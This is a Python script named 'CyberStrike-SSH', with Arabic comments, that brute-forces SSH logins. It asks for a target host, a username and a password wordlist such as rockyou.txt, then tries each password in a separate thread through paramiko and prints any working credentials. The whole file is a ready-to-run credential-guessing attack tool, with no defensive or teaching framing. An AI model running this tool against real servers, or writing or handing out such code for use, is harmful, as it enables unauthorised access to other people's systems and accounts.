import paramiko
import threading
import sys
import time

# متغير لمنع تداخل الطباعة في الـ Terminal أثناء عمل الـ Threads
print_lock = threading.Lock()
# متغير يتغير عند إيجاد كلمة المرور الصحيحة لإيقاف بقية العمليات
password_found = False

def ssh_brute_force(hostname, username, password):
    global password_found
    
    if password_found:
        return

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(hostname, username=username, password=password, timeout=3)
        
        with print_lock:
            print(f"\n[+] SUCCESS: Username: '{username}' | Password Found: '{password}'")
            password_found = True
        ssh.close()
    except paramiko.AuthenticationException:
        with print_lock:
            print(f"[-] Failed: {password}")
    except Exception as e:
        pass

def main():
    print("=========================================")
    print("   CyberStrike-SSH (SSH Brute-Forcer)    ")
    print("=========================================")
    
    target_host = input("Enter target IP/Hostname: ").strip()
    target_user = input("Enter SSH Username: ").strip()
    wordlist_path = input("Enter password wordlist file path (e.g., rockyou.txt): ").strip()

    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as file:
            passwords = file.read().splitlines()
    except FileNotFoundError:
        print(f"[-] Error: Wordlist file '{wordlist_path}' not found.")
        return

    print(f"\n[*] CyberStrike initiated against {target_host} using {len(passwords)} passwords...\n")

    threads = []
    for password in passwords:
        if password_found:
            break
            
        t = threading.Thread(target=ssh_brute_force, args=(target_host, target_user, password))
        threads.append(t)
        t.start()
        time.sleep(0.1)

    for t in threads:
        t.join()

    if not password_found:
        print("\n[-] Strike completed. Password not found.")

if __name__ == "__main__":
    main()
